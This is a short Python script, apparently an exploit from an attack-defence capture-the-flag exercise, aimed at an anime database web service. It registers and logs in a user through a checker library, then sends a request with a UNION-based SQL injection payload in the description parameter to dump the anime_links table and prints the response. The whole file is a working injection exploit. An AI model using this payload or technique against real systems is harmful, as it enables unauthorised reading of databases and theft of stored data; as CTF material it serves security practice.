#!/usr/bin/env python3

import sys

from anidb_lib import CheckMachine

host = sys.argv[1]

mch = CheckMachine(host)
u, p = mch.register_user()
sess = mch.login_user(u, p)

r = sess.get(f"http://{host}:8000/api/db/anime?description='union select *,1,1,1 from anime_links --")

print(r.text)
